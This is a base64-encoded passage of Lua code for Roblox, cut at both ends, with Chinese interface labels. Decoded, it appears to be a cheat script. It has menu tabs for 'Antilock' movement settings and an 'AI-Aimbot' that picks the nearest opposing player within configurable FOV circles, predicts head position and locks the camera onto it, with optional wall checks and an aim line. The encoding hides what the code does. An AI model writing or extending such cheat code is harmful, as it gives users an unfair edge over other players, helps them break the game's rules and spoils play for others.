kLlJhbmRvbWl6YXRpb24gPSB2YWx1ZQogICAgICAgIGVuZAogICAgfSkKICAgIAogICAgVGFiMjpDcmVhdGVEcm9wZG93bih7CiAgICAgICAgTmFtZSA9ICLnp7vliqjmqKHlvI8iLAogICAgICAgIE9wdGlvbnMgPSB7IkNpcmN1bGFyIiwgIlppZ3phZyIsICJSYW5kb20iLCAiTGluZWFyIn0sCiAgICAgICAgQ3VycmVudE9wdGlvbiA9IEFudGlsb2NrLkFkdmFuY2VkLlBhdHRlcm4sCiAgICAgICAgQ2FsbGJhY2sgPSBmdW5jdGlvbih2YWx1ZSkKICAgICAgICAgICAgQW50aWxvY2suQWR2YW5jZWQuUGF0dGVybiA9IHZhbHVlCiAgICAgICAgZW5kCiAgICB9KQogICAgCiAgICBUYWIyOkNyZWF0ZVRvZ2dsZSh7CiAgICAgICAgTmFtZSA9ICLoh6rpgILlupTmqKHlvI8iLAogICAgICAgIEN1cnJlbnRWYWx1ZSA9IEFudGlsb2NrLkFkdmFuY2VkLkFkYXB0aXZlLAogICAgICAgIENhbGxiYWNrID0gZnVuY3Rpb24odmFsdWUpCiAgICAgICAgICAgIEFudGlsb2NrLkFkdmFuY2VkLkFkYXB0aXZlID0gdmFsdWUKICAgICAgICBlbmQKICAgIH0pCiAgICAKICAgIC0tIOiHquWumuS5ieaooeW8j+iuvue9rgogICAgbG9jYWwgQ3VzdG9tU2VjdGlvbiA9IFRhYjI6Q3JlYXRlU2VjdGlvbigi6Ieq5a6a5LmJ5qih5byPIikKICAgIAogICAgVGFiMjpDcmVhdGVTbGlkZXIoewogICAgICAgIE5hbWUgPSAiWOi9tOS5mOaVsCIsCiAgICAgICAgUmFuZ2UgPSB7MC4xLCAzLjB9LAogICAgICAgIEluY3JlbWVudCA9IDAuMSwKICAgICAgICBTdWZmaXggPSAi5YCNIiwKICAgICAgICBDdXJyZW50VmFsdWUgPSBBbnRpbG9jay5DdXN0b20uWE11bHRpcGxpZXIsCiAgICAgICAgQ2FsbGJhY2sgPSBmdW5jdGlvbih2YWx1ZSkKICAgICAgICAgICAgQW50aWxvY2suQ3VzdG9tLlhNdWx0aXBsaWVyID0gdmFsdWUKICAgICAgICBlbmQKICAgIH0pCiAgICAKICAgIFRhYjI6Q3JlYXRlU2xpZGVyKHsKICAgICAgICBOYW1lID0gIlnovbTkuZjmlbAiLAogICAgICAgIFJhbmdlID0gezAuMSwgMy4wfSwKICAgICAgICBJbmNyZW1lbnQgPSAwLjEsCiAgICAgICAgU3VmZml4ID0gIuWAjSIsCiAgICAgICAgQ3VycmVudFZhbHVlID0gQW50aWxvY2suQ3VzdG9tLllNdWx0aXBsaWVyLAogICAgICAgIENhbGxiYWNrID0gZnVuY3Rpb24odmFsdWUpCiAgICAgICAgICAgIEFudGlsb2NrLkN1c3RvbS5ZTXVsdGlwbGllciA9IHZhbHVlCiAgICAgICAgZW5kCiAgICB9KQogICAgCiAgICBUYWIyOkNyZWF0ZVNsaWRlcih7CiAgICAgICAgTmFtZSA9ICJa6L205LmY5pWwIiwKICAgICAgICBSYW5nZSA9IHswLjEsIDMuMH0sCiAgICAgICAgSW5jcmVtZW50ID0gMC4xLAogICAgICAgIFN1ZmZpeCA9ICLlgI0iLAogICAgICAgIEN1cnJlbnRWYWx1ZSA9IEFudGlsb2NrLkN1c3RvbS5aTXVsdGlwbGllciwKICAgICAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHZhbHVlKQogICAgICAgICAgICBBbnRpbG9jay5DdXN0b20uWk11bHRpcGxpZXIgPSB2YWx1ZQogICAgICAgIGVuZAogICAgfSkKICAgIAogICAgLS0g54q25oCB5pi+56S6CiAgICBUYWIyOkNyZWF0ZVNlY3Rpb24oIueKtuaAgeS/oeaBryIpCiAgICBsb2NhbCBTdGF0dXNMYWJlbCA9IFRhYjI6Q3JlYXRlTGFiZWwoIkFudGlsb2NrIOeKtuaAgTog5pyq5ZCv55SoIikKICAgIAogICAgLS0g5pu05paw54q25oCB5pi+56S6CiAgICBzcGF3bihmdW5jdGlvbigpCiAgICAgICAgd2hpbGUgdHJ1ZSBkbwogICAgICAgICAgICBsb2NhbCBzdGF0dXMgPSBBbnRpbG9ja01vZHVsZS5HZXRTdGF0dXMoKQogICAgICAgICAgICBsb2NhbCBzdGF0dXNUZXh0ID0gc3RyaW5nLmZvcm1hdCgKICAgICAgICAgICAgICAgICJBbnRpbG9jayDnirbmgIE6ICVzIHwg5qih5byPOiAlcyB8IOW8uuW6pjogJS4xZiB8IOmAn+W6pjogJS4xZiIsCiAgICAgICAgICAgICAgICBzdGF0dXMuRW5hYmxlZCBhbmQgIuW3suWQr+eUqCIgb3IgIuacquWQr+eUqCIsCiAgICAgICAgICAgICAgICBzdGF0dXMuTW9kZSwKICAgICAgICAgICAgICAgIHN0YXR1cy5TdHJlbmd0aCwKICAgICAgICAgICAgICAgIHN0YXR1cy5TcGVlZAogICAgICAgICAgICApCiAgICAgICAgICAgIFN0YXR1c0xhYmVsOlNldChzdGF0dXNUZXh0KQogICAgICAgICAgICB3YWl0KDEpCiAgICAgICAgZW5kCiAgICBlbmQpCiAgICAKICAgIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiAgICAtLSDlj4zni6znq4sgRk9W77yI55m96Lef6ZqPICsg5qmZ5Zu65a6a77yJ6YO95Y+C5LiO556E5YeG5Yik5a6aIC0g5aKe5by654mICiAgICAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQogICAgLS0g6YCa55So5Y+C5pWwCiAgICBsb2NhbCBhaW1ib3RFbmFibGVkICAgICAgPSBmYWxzZQogICAgbG9jYWwgYWltYm90U21vb3RoICAgICAgID0gMC4zNQogICAgbG9jYWwgYWltYm90Qm9uZSAgICAgICAgID0gIkhlYWQiCiAgICBsb2NhbCBhaW1ib3RQcmVkaWN0aW9uICAgPSAwLjEyCiAgICBsb2NhbCBhaW1ib3RDaGVja1RlYW0gICAgPSBmYWxzZQogICAgbG9jYWwgYWltYm90Q29ubgogICAgbG9jYWwgYWltYm90TW9kZSA9ICJEaXN0YW5jZSIKICAgIGxvY2FsIHdhbGxDaGVja0VuYWJsZWQgPSBmYWxzZQogICAgbG9jYWwgYWltTGluZUVuYWJsZWQgPSBmYWxzZQogICAgbG9jYWwgYWltTGluZSA9IERyYXdpbmcubmV3KCJMaW5lIikKICAgIAogICAgLS0g5Yid5aeL5YyW6Ieq556E57q/5p2hCiAgICBhaW1MaW5lLlZpc2libGUgPSBmYWxzZQogICAgYWltTGluZS5UaGlja25lc3MgPSAxLjUKICAgIGFpbUxpbmUuQ29sb3IgPSBDb2xvcjMuZnJvbVJHQigwLCAyNTUsIDApCiAgICBhaW1MaW5lLlpJbmRleCA9IDExCiAgICAKICAgIC0tIOe8uuWkseWPmOmHj+S4gOasoeaAp+ihpeWFqAogICAgbG9jYWwgQ2FtZXJhID0gd29ya3NwYWNlLkN1cnJlbnRDYW1lcmEKICAgIGxvY2FsIFVzZXJJbnB1dFNlcnZpY2UgPSBnYW1lOkdldFNlcnZpY2UoIlVzZXJJbnB1dFNlcnZpY2UiKQogICAgbG9jYWwgUGxheWVycyA9IGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpCiAgICBsb2NhbCBMb2NhbFBsYXllciA9IFBsYXllcnMuTG9jYWxQbGF5ZXIKICAgIAogICAgLS0gMS4g6Lef6ZqP6byg5qCHIEZPVgogICAgbG9jYWwgbW91c2VGT1YgICAgICA9IDEyMAogICAgbG9jYWwgbW91c2VGb3ZDaXJjbGUgPSBEcmF3aW5nLm5ldygiQ2lyY2xlIikKICAgIG1vdXNlRm92Q2lyY2xlLk51bVNpZGVzICA9IDY0CiAgICBtb3VzZUZvdkNpcmNsZS5SYWRpdXMgICAgPSBtb3VzZUZPVgogICAgbW91c2VGb3ZDaXJjbGUuVGhpY2tuZXNzID0gMS41CiAgICBtb3VzZUZvdkNpcmNsZS5Db2xvciAgICAgPSBDb2xvcjMuZnJvbVJHQigyNTUsMjU1LDI1NSkKICAgIG1vdXNlRm92Q2lyY2xlLkZpbGxlZCAgICA9IGZhbHNlCiAgICBtb3VzZUZvdkNpcmNsZS5WaXNpYmxlICAgPSBmYWxzZQogICAgbW91c2VGb3ZDaXJjbGUuWkluZGV4ID0gMTAKICAgIAogICAgLS0gMi4g5Zu65a6a5Lit5b+DIEZPVgogICAgbG9jYWwgZml4ZWRGT1YgICAgICA9IDkwCiAgICBsb2NhbCBmaXhlZEZvdkNpcmNsZSA9IERyYXdpbmcubmV3KCJDaXJjbGUiKQogICAgZml4ZWRGb3ZDaXJjbGUuTnVtU2lkZXMgID0gNjQKICAgIGZpeGVkRm92Q2lyY2xlLlJhZGl1cyAgICA9IGZpeGVkRk9WCiAgICBmaXhlZEZvdkNpcmNsZS5UaGlja25lc3MgPSAxLjUKICAgIGZpeGVkRm92Q2lyY2xlLkNvbG9yICAgICA9IENvbG9yMy5mcm9tUkdCKDI1NSwxNjUsMCkKICAgIGZpeGVkRm92Q2lyY2xlLkZpbGxlZCAgICA9IGZhbHNlCiAgICBmaXhlZEZvdkNpcmNsZS5WaXNpYmxlICAgPSBmYWxzZQogICAgZml4ZWRGb3ZDaXJjbGUuWkluZGV4ID0gOQogICAgCiAgICAtLSDlm7rlrprlnIbkuK3lv4PkuIDmrKHorr7nva4KICAgIGxvY2FsIGZ1bmN0aW9uIHNldEZpeGVkQ2VudGVyKCkKICAgICAgICBsb2NhbCBjZW50ZXIgPSBWZWN0b3IyLm5ldyhDYW1lcmEuVmlld3BvcnRTaXplLlgvMiwgQ2FtZXJhLlZpZXdwb3J0U2l6ZS5ZLzIpCiAgICAgICAgZml4ZWRGb3ZDaXJjbGUuUG9zaXRpb24gPSBjZW50ZXIKICAgICAgICAtLSDliJ3lp4vljJboh6rnnoTnur/mnaHnmoTotbfngrkKICAgICAgICBhaW1MaW5lLkZyb20gPSBjZW50ZXIKICAgIGVuZAogICAgQ2FtZXJhOkdldFByb3BlcnR5Q2hhbmdlZFNpZ25hbCgiVmlld3BvcnRTaXplIik6Q29ubmVjdChzZXRGaXhlZENlbnRlcikKICAgIHNldEZpeGVkQ2VudGVyKCkKICAgIAogICAgLS0g5bel5YW35Ye95pWwCiAgICBsb2NhbCBmdW5jdGlvbiBnZXRBaW1Qb3MoY2hhcmFjdGVyKQogICAgICAgIGlmIG5vdCBjaGFyYWN0ZXIgdGhlbiByZXR1cm4gbmlsIGVuZAogICAgICAgIGxvY2FsIHJvb3QgPSBjaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKQogICAgICAgIGxvY2FsIGJvbmUgPSBjaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoYWltYm90Qm9uZSkgb3IgY2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIZWFkIikKICAgICAgICBpZiBub3QgKHJvb3QgYW5kIGJvbmUpIHRoZW4gcmV0dXJuIG5pbCBlbmQKICAgICAgICAKICAgICAgICBsb2NhbCB2ZWwgPSByb290LlZlbG9jaXR5CiAgICAgICAgcmV0dXJuIGJvbmUuUG9zaXRpb24gKyB2ZWwgKiBhaW1ib3RQcmVkaWN0aW9uCiAgICBlbmQKICAgIAogICAgbG9jYWwgZnVuY3Rpb24gaXNWaXNpYmxlKHBvcywgdGFyZ2V0Q2hhcmFjdGVyKQogICAgICAgIGlmIG5vdCB3YWxsQ2hlY2tFbmFibGVkIHRoZW4gcmV0dXJuIHRydWUgZW5kCiAgICAgICAgCiAgICAgICAgbG9jYWwgb3JpZ2luID0gQ2FtZXJhLkNGcmFtZS5Qb3NpdGlvbgogICAgICAgIGxvY2FsIGRpcmVjdGlvbiA9IChwb3MgLSBvcmlnaW4pLlVuaXQKICAgICAgICBsb2NhbCByYXkgPSBSYXkubmV3KG9yaWdpbiwgZGlyZWN0aW9uICogKG9yaWdpbiAtIHBvcykuTWFnbml0dWRlKQogICAgICAgIAogICAgICAgIGxvY2FsIGlnbm9yZUxpc3QgPSB7TG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLCBDYW1lcmF9CiAgICAgICAgaWYgdGFyZ2V0Q2hhcmFjdGVyIHRoZW4KICAgICAgICAgICAgdGFibGUuaW5zZXJ0KGlnbm9yZUxpc3QsIHRhcmdldENoYXJhY3RlcikKICAgICAgICBlbmQKICAgICAgICAKICAgICAgICBsb2NhbCBwYXJ0LCBwb3NpdGlvbiA9IHdvcmtzcGFjZTpGaW5kUGFydE9uUmF5V2l0aElnbm9yZUxpc3QocmF5LCBpZ25vcmVMaXN0KQogICAgICAgIHJldHVybiBwYXJ0ID09IG5pbAogICAgZW5kCiAgICAKICAgIGxvY2FsIGZ1bmN0aW9uIGluQW55Rk9WKHdvcmxkUG9zKQogICAgICAgIGxvY2FsIHNjcmVlblBvcyA9IENhbWVyYTpXb3JsZFRvVmlld3BvcnRQb2ludCh3b3JsZFBvcykKICAgICAgICBpZiBzY3JlZW5Qb3MuWiA8PSAwIHRoZW4gcmV0dXJuIGZhbHNlIGVuZAogICAgICAgIAogICAgICAgIGxvY2FsIG1vdXNlUG9zID0gVXNlcklucHV0U2VydmljZTpHZXRNb3VzZUxvY2F0aW9uKCkKICAgICAgICBsb2NhbCBjZW50ZXIgPSBWZWN0b3IyLm5ldyhDYW1lcmEuVmlld3BvcnRTaXplLlgvMiwgQ2FtZXJhLlZpZXdwb3J0U2l6ZS5ZLzIpCiAgICAgICAgCiAgICAgICAgaWYgbW91c2VGb3ZDaXJjbGUuVmlzaWJsZSB0aGVuCiAgICAgICAgICAgIGlmIChWZWN0b3IyLm5ldyhzY3JlZW5Qb3MuWCwgc2NyZWVuUG9zLlkpIC0gbW91c2VQb3MpLk1hZ25pdHVkZSA8PSBtb3VzZUZPViB0aGVuCiAgICAgICAgICAgICAgICByZXR1cm4gdHJ1ZQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgICAgICAKICAgICAgICBpZiBmaXhlZEZvdkNpcmNsZS5WaXNpYmxlIHRoZW4KICAgICAgICAgICAgaWYgKFZlY3RvcjIubmV3KHNjcmVlblBvcy5YLCBzY3JlZW5Qb3MuWSkgLSBjZW50ZXIpLk1hZ25pdHVkZSA8PSBmaXhlZEZPViB0aGVuCiAgICAgICAgICAgICAgICByZXR1cm4gdHJ1ZQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgICAgICAKICAgICAgICByZXR1cm4gZmFsc2UKICAgIGVuZAogICAgCiAgICBsb2NhbCBmdW5jdGlvbiBnZXRDbG9zZXN0KCkKICAgICAgICBsb2NhbCBjbG9zZXN0LCBtaW5EaXN0ID0gbmlsLCBtYXRoLmh1Z2UKICAgICAgICBsb2NhbCBjZW50ZXIgPSBWZWN0b3IyLm5ldyhDYW1lcmEuVmlld3BvcnRTaXplLlgvMiwgQ2FtZXJhLlZpZXdwb3J0U2l6ZS5ZLzIpCiAgICAgICAgCiAgICAgICAgZm9yIF8sIHBsciBpbiBpcGFpcnMoUGxheWVyczpHZXRQbGF5ZXJzKCkpIGRvCiAgICAgICAgICAgIGlmIHBsciA9PSBMb2NhbFBsYXllciB0aGVuIGNvbnRpbnVlIGVuZAogICAgICAgICAgICBpZiBhaW1ib3RDaGVja1RlYW0gYW5kIHBsci5UZWFtIGFuZCBwbHIuVGVhbSA9PSBMb2NhbFBsYXllci5UZWFtIHRoZW4gY29udGludWUgZW5kCiAgICAgICAgICAgIAogICAgICAgICAgICBsb2NhbCBjaGFyID0gcGxyLkNoYXJhY3RlcgogICAgICAgICAgICBpZiBub3QgY2hhciB0aGVuIGNvbnRpbnVlIGVuZAogICAgICAgICAgICAKICAgICAgICAgICAgbG9jYWwgYWltUG9zID0gZ2V0QWltUG9zKGNoYXIpCiAgICAgICAgICAgIGlmIG5vdCBhaW1Qb3MgdGhlbiBjb250aW51ZSBlbmQKICAgICAgICAgICAgaWYgbm90IGluQW55Rk9WKGFpbVBvcykgdGhlbiBjb250aW51ZSBlbmQKICAgICAgICAgICAgCiAgICAgICAgICAgIGxvY2FsIHNwID0gQ2FtZXJhOldvcmxkVG9WaWV3cG9ydFBvaW50KGFpbVBvcykKICAgICAgICAgICAgaWYgc3AuWiA8PSAwIHRoZW4gY29udGludWUgZW5kCiAgICAgICAgICAgIAogICAgICAgICAgICBsb2NhbCBpZ25vcmVMaXN0ID0ge0xvY2FsUGxheWVyLkNoYXJhY3RlciwgQ2FtZXJhfQogICAgICAgICAgICBpZiBub3QgaXNWaXNpYmxlKGFpbVBvcywgY2hhcikgdGhlbiBjb250aW51ZSBlbmQKICAgICAgICAgICAgCiAgICAgICAgICAgIGxvY2FsIGRpc3QKICAgICAgICAgICAgaWYgYWltYm90TW9kZSA9PSAiRGlzdGFuY2UiIHRoZW4KICAgICAgICAgICAgICAgIGRpc3QgPSAoYWltUG9zIC0gQ2FtZXJhLkNGcmFtZS5Qb3NpdGlvbikuTWFnbml0dWRlCiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgIGRpc3QgPSAoVmVjdG9yMi5uZXcoc3AuWCwgc3AuWSkgLSBjZW50ZXIpLk1hZ25pdHVkZQogICAgICAgICAgICBlbmQKICAgICAgICAgICAgCiAgICAgICAgICAgIGlmIGRpc3QgPCBtaW5EaXN0IHRoZW4KICAgICAgICAgICAgICAgIG1pbkRpc3QsIGNsb3Nlc3QgPSBkaXN0LCBwbHIKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICAgICAgcmV0dXJuIGNsb3Nlc3QKICAgIGVuZAogICAgCiAgICAtLSDkuLvlvqrnjq/vvIjlrozlhajnp7vpmaTkuoblvIDngavlip/og73vvIkKICAgIGxvY2FsIGZ1bmN0aW9uIHN0YXJ0QWltYm90KCkKICAgICAgICBpZiBhaW1ib3RDb25uIHRoZW4gcmV0dXJuIGVuZAogICAgICAgIAogICAgICAgIGFpbWJvdENvbm4gPSBnYW1lOkdldFNlcnZpY2UoIlJ1blNlcnZpY2UiKS5SZW5kZXJTdGVwcGVkOkNvbm5lY3QoZnVuY3Rpb24oKQogICAgICAgICAgICBpZiBub3QgYWltYm90RW5hYmxlZCB0aGVuIAogICAgICAgICAgICAgICAgYWltTGluZS5WaXNpYmxlID0gZmFsc2UKICAgICAgICAgICAgICAgIHJldHVybiAKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIAogICAgICAgICAgICBtb3VzZUZvdkNpcmNsZS5Qb3NpdGlvbiA9IFVzZXJJbnB1dFNlcnZpY2U6R2V0TW91c2VMb2NhdGlvbigpCgogICAgICAgICAgICBsb2NhbCB0YXJnZXQgPSBnZXRDbG9zZXN0KCkKICAgICAgICAgICAgaWYgbm90IHRhcmdldCBvciBub3QgdGFyZ2V0LkNoYXJhY3RlciB0aGVuIAogICAgICAgICAgICAgICAgYWltTGluZS5WaXNpYmxlID0gZmFsc2UKICAgICAgICAgICAgICAgIHJldHVybiAKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIAogICAgICAgICAgICBsb2NhbCBhaW1Qb3MgPSBnZXRBaW1Qb3ModGFyZ2V0LkNoYXJhY3RlcikKICAgICAgICAgICAgaWYgbm90IGFpbVBvcyB0aGVuIAogICAgICAgICAgICAgICAgYWltTGluZS5WaXNpYmxlID0gZmFsc2UKICAgICAgICAgICAgICAgIHJldHVybiAKICAgICAgICAgICAgZW5kCgogICAgICAgICAgICBpZiBhaW1MaW5lRW5hYmxlZCB0aGVuCiAgICAgICAgICAgICAgICBsb2NhbCBzY3JlZW5Qb3MgPSBDYW1lcmE6V29ybGRUb1ZpZXdwb3J0UG9pbnQoYWltUG9zKQogICAgICAgICAgICAgICAgaWYgc2NyZWVuUG9zLlogPiAwIHRoZW4KICAgICAgICAgICAgICAgICAgICBhaW1MaW5lLkZyb20gPSBWZWN0b3IyLm5ldyhDYW1lcmEuVmlld3BvcnRTaXplLlgvMiwgQ2FtZXJhLlZpZXdwb3J0U2l6ZS5ZLzIpCiAgICAgICAgICAgICAgICAgICAgYWltTGluZS5UbyA9IFZlY3RvcjIubmV3KHNjcmVlblBvcy5YLCBzY3JlZW5Qb3MuWSkKICAgICAgICAgICAgICAgICAgICBhaW1MaW5lLlZpc2libGUgPSB0cnVlCiAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgYWltTGluZS5WaXNpYmxlID0gZmFsc2UKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICBhaW1MaW5lLlZpc2libGUgPSBmYWxzZQogICAgICAgICAgICBlbmQKICAgICAgICAgICAgCiAgICAgICAgICAgIGxvY2FsIGRlbHRhID0gYWltUG9zIC0gQ2FtZXJhLkNGcmFtZS5Qb3NpdGlvbgogICAgICAgICAgICBpZiBkZWx0YS5NYWduaXR1ZGUgPCAwLjAxIHRoZW4gcmV0dXJuIGVuZAogICAgICAgICAgICAKICAgICAgICAgICAgbG9jYWwgdGFyZ2V0Q0YgPSBDRnJhbWUubmV3KENhbWVyYS5DRnJhbWUuUG9zaXRpb24sIENhbWVyYS5DRnJhbWUuUG9zaXRpb24gKyBkZWx0YSkKICAgICAgICAgICAgbG9jYWwgY3VycmVudExvb2sgPSBDYW1lcmEuQ0ZyYW1lLkxvb2tWZWN0b3IKICAgICAgICAgICAgbG9jYWwgdGFyZ2V0TG9vayA9IHRhcmdldENGLkxvb2tWZWN0b3IKICAgICAgICAgICAgCiAgICAgICAgICAgIGxvY2FsIGRvdCA9IGN1cnJlbnRMb29rOkRvdCh0YXJnZXRMb29rKQogICAgICAgICAgICBsb2NhbCBhbmdsZSA9IG1hdGguYWNvcyhtYXRoLmNsYW1wKGRvdCwgLTEsIDEpKQogICAgICAgICAgICBsb2NhbCBtYXhBbmdsZSA9IG1hdGgucmFkKDkwKQogICAgICAgICAgICAKICAgICAgICAgICAgaWYgYW5nbGUgPD0gbWF4QW5nbGUgdGhlbgogICAgICAgICAgICAgICAgbG9jYWwgc21vb3RoRmFjdG9yID0gbWF0aC5jbGFtcChhaW1ib3RTbW9vdGgsIDAuMDEsIDAuOTkpCiAgICAgICAgICAgICAgICBsb2NhbCBuZXdMb29rID0gY3VycmVudExvb2s6TGVycCh0YXJnZXRMb29rLCAxIC0gc21vb3RoRmFjdG9yKQogICAgICAgICAgICAgICAgQ2FtZXJhLkNGcmFtZSA9IENGcmFtZS5uZXcoQ2FtZXJhLkNGcmFtZS5Qb3NpdGlvbiwgQ2FtZXJhLkNGcmFtZS5Qb3NpdGlvbiArIG5ld0xvb2spCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZCkKICAgIGVuZAogICAgCiAgICBsb2NhbCBmdW5jdGlvbiBzdG9wQWltYm90KCkKICAgICAgICBpZiBhaW1ib3RDb25uIHRoZW4gCiAgICAgICAgICAgIGFpbWJvdENvbm46RGlzY29ubmVjdCgpIAogICAgICAgICAgICBhaW1ib3RDb25uID0gbmlsIAogICAgICAgIGVuZAogICAgICAgIG1vdXNlRm92Q2lyY2xlLlZpc2libGUgPSBmYWxzZQogICAgICAgIGZpeGVkRm92Q2lyY2xlLlZpc2libGUgPSBmYWxzZQogICAgICAgIGFpbUxpbmUuVmlzaWJsZSA9IGZhbHNlCiAgICBlbmQKICAgIAogICAgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KICAgIC0tIEFJLUFpbWJvdCDni6znq4vmoIfnrb7pobUKICAgIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiAgICBsb2NhbCBUYWIzID0gV2luZG93OkNyZWF0ZVRhYigiQUktQWltYm90IiwgNzczMzk2MTc0OCkKICAgIAogICAgVGFiMzpDcmVhdGVTZWN0aW9uKCJBSS1BaW1ib3QiKQogICAgVGFiMzpDcmVhdGVUb2dnbGUoewogICAgICAgIE5hbWUgPSAi5ZCv55SoIEFpbWJvdCIsCiAgICAgICAgQ3VycmVudFZhbHVlID0gZmFsc2UsCiAgICAgICAgQ2FsbGJhY2sgPSBmdW5jdGlvbih2KQogICAgICAgICAgICBhaW1ib3RFbmFibGVkID0gdgogICAgICAgICAgICBpZiB2IHRoZW4gCiAgICAgICAgICAgICAgICBzdGFydEFpbWJvdCgpIAogICAgICAgICAgICBlbHNlIAogICAgICAgICAgICAgICAgc3RvcEFpbWJvdCgpIAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIH0pCiAgICAKICAgIFRhYjM6Q3JlYXRlVG9nZ2xlKHsKICAgICAgICBOYW1lID0gIuS7heeehOWHhuaVjOS6uiIsCiAgICAgICAgQ3VycmVudFZhbHVlID0gYWltYm90Q2hlY2tUZWFtLAogICAgICAgIENhbGxiYWNrID0gZnVuY3Rpb24odikgYWltYm90Q2hlY2tUZWFtID0gdiBlbmQKICAgIH0pCiAgICAKICAgIFRhYjM6Q3JlYXRlVG9nZ2xlKHsKICAgICAgICBOYW1lID0gIuWimeS9k+ajgOa1iyIsCiAgICAgICAgQ3VycmVudFZhbHVlID0gd2FsbENoZWNrRW5hYmxlZCwKICAgICAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHYpIHdhbGxDaGVja0VuYWJsZWQgPSB2IGVuZAogICAgfSkKICAgIAogICAgVGFiMzpDcmVhdGVUb2dnbGUoewogICAgICAgIE5hbWUgPSAi5pi+56S66Ieq556E57q/5p2hIiwKICAgICAgICBDdXJyZW50VmFsdWUgPSBhaW1MaW5lRW5hYmxlZCwKICAgICAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHYpIGFpbUxpbmVFbmFibGVkID0gdiBlbmQKICAgIH0pCiAgICAKICAgIFRhYjM6Q3JlYXRlRHJvcGRvd24oewogICAgICAgIE5hbWUgPSAi556E5YeG5pa55byPIiwKICAgICAgICBPcHRpb25zID0geyJEaXN0YW5jZSIsICJDcm9zc2hhaXIifSwKICAgICAgICBDdXJyZW50T3B0aW9uID0gYWltYm90TW9kZSwKICAgICAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHYpIGFpbWJvdE1vZGUgPSB2IGVuZAogICAgfSkKICAgIAogICAgVGFiMzpDcmVhdGVTZWN0aW9uKCLot5/pmo/pvKDmoIcgRk9WIikKICAgIFRhYjM6Q3JlYXRlVG9nZ2xlKHsgCiAgICAgICAgTmFtZSA9ICLmmL7npLrot5/pmo9GT1YiLCAKICAgICAgICBDdXJyZW50VmFsdWUgPSBmYWxzZSwgCiAgICAgICAgQ2FsbGJhY2sgPSBmdW5jdGlvbih2KSBtb3VzZUZvdkNpcmNsZS5WaXNpYmxlID0gdiBlbmQgCiAgICB9KQogICAgCiAgICBUYWIzOkNyZWF0ZVNsaWRlcih7CiAgICAgICAgTmFtZSA9ICLljYrlvoTvvIjmu5HmnaHvvIkiLAogICAgICAgIFJhbmdlID0gezAsIDUwMH0sCiAgICAgICAgSW5jcmVtZW50ID0gNSwKICAgICAgICBTdWZmaXggPSAicHgiLAogICAgICAgIEN1cnJlbnRWYWx1ZSA9IG1vdXNlRk9WLAogICAgICAgIENhbGxiYWNrID0gZnVuY3Rpb24odikgCiAgICAgICAgICAgIG1vdXNlRk9WID0gdgogICAgICAgICAgICBtb3VzZUZvdkNpcmNsZS5SYWRpdXMgPSB2IAogICAgICAgIGVuZAogICAgfSkKICAgIAogICAgVGFiMzpDcmVhdGVJbnB1dCh7CiAgICAgICAgTmFtZSA9ICLljYrlvoTvvIjovpPlhaXvvIkiLAogICAgICAgIFBsYWNlaG9sZGVyVGV4dCA9IHRvc3RyaW5nKG1vdXNlRk9WKSwKICAgICAgICBSZW1vdmVUZXh0QWZ0ZXJGb2N1c0xvc3QgPSBmYWxzZSwKICAgICAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHR4dCkgCiAgICAgICAgICAgIGxvY2FsIG4gPSB0b251bWJlcih0eHQpIAogICAgICAgICAgICBpZiBuIHRoZW4gCiAgICAgICAgICAgICAgICBtb3VzZUZPViA9IG4KICAgICAgICAgICAgICAgIG1vdXNlRm92Q2lyY2xlLlJhZGl1cyA9IG4KICAgICAgICAgICAgZW5kIAogICAgICAgIGVuZAogICAgfSkKICAgIAogICAgVGFiMzpDcmVhdGVTZWN0aW9uKCLlm7rlrprkuK3lv4MgRk9WIikKICAgIFRhYjM6Q3JlYXRlVG9nZ2xlKHsgCiAgICAgICAgTmFtZSA9ICLmmL7npLrlm7rlrppGT1YiLCAKICAgICAgICBDdXJyZW50VmFsdWUgPSBmYWxzZSwgCiAgICAgICAgQ2FsbGJhY2sgPSBmdW5jdGlvbih2KSBmaXhlZEZvdkNpcmNsZS5WaXNpYmxlID0gdiBlbmQgCiAgICB9KQogICAgCiAgICBUYWIzOkNyZWF0ZVNsaWRlcih7CiAgICAgICAgTmFtZSA9ICLljYrlvoTvvIjmu5HmnaHvvIkiLAogICAgICAgIFJhbmdlID0gezAsIDUwMH0sCiAgICAgICAgSW5jcmVtZW50ID0gNSwKICAgICAgICBTdWZmaXggPSAicHgiLAogICAgICAgIEN1cnJlbnRWYWx1ZSA9IGZpeGVkRk9WLAogICAgICAgIENhbGxiYWNrID0gZnVuY3Rpb24odikgCiAgICAgICAgICAgIGZpeGVkRk9WID0gdgogICAgICAgICAgICBmaXhlZEZvdkNpcmNsZS5SYWRpdXMgPSB2IAogICAgICAgIGVuZAogICAgfSkKICAgIAogICAgVGFiMzp